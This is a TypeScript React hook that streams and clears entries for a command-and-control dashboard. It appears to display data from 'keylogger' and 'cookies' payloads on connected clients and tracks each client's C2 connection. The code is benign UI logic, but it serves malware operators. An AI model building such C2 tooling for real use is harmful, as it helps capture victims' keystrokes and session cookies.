import { useState, useCallback, useMemo } from "react";
import { useWebSocket } from "@/hooks/use-websocket";
import { buildViewerWsUrl } from "@/lib/utils";

export interface UsePayloadEntriesOptions {
  clientId: string;
  /** Payload name used to build the WS URL (e.g. "keylogger", "cookies"). */
  payloadName: string;
  /** WS message type for incremental append messages (e.g. "entries", "cookies"). */
  incrementalType: string;
  /** Key of the array field in both init and incremental messages. */
  dataField: string;
}

export interface UsePayloadEntriesResult<T> {
  entries: T[];
  status: "connecting" | "open" | "closed";
  /** False when the client has disconnected from C2 (set to true on next incremental message). */
  clientConnected: boolean;
  /** False when the payload is not enabled on this client (set by client-info). */
  payloadEnabled: boolean;
  /** Send a clear command to the server and optimistically reset local state. */
  clearEntries: () => void;
}

/**
 * Generic hook for DB-backed payload entry streams (keylogger, cookies).
 * Handles client-info, init (replace), incremental (append), cleared, and disconnected messages.
 */
export function usePayloadEntries<T>({
  clientId,
  payloadName,
  incrementalType,
  dataField,
}: UsePayloadEntriesOptions): UsePayloadEntriesResult<T> {
  const [entries, setEntries] = useState<T[]>([]);
  const [clientConnected, setClientConnected] = useState(true);
  const [payloadEnabled, setPayloadEnabled] = useState(true);

  const wsUrl = useMemo(() => buildViewerWsUrl(clientId, payloadName), [clientId, payloadName]);

  const onMessage = useCallback((event: MessageEvent) => {
    let msg: Record<string, unknown>;
    try {
      msg = JSON.parse(event.data as string);
    } catch {
      return;
    }

    if (msg.type === "client-info") {
      setClientConnected(msg.connected as boolean ?? true);
      setPayloadEnabled(msg.payloadEnabled as boolean ?? true);
    } else if (msg.type === "init") {
      // Do not reset clientConnected — init is sent for both offline (DB load) and live clients.
      setEntries((msg[dataField] as T[]) ?? []);
    } else if (msg.type === incrementalType) {
      // Incremental data only arrives when the client is actively sending.
      setClientConnected(true);
      setEntries((prev) => [...prev, ...((msg[dataField] as T[]) ?? [])]);
    } else if (msg.type === "cleared") {
      setEntries([]);
    } else if (msg.type === "disconnected") {
      setClientConnected(false);
    }
  }, [incrementalType, dataField]);

  const { status, send } = useWebSocket(wsUrl, { onMessage });

  const clearEntries = useCallback(() => {
    send(JSON.stringify({ type: "clear" }));
    setEntries([]); // Optimistic reset
  }, [send]);

  return { entries, status, clientConnected, payloadEnabled, clearEntries };
}
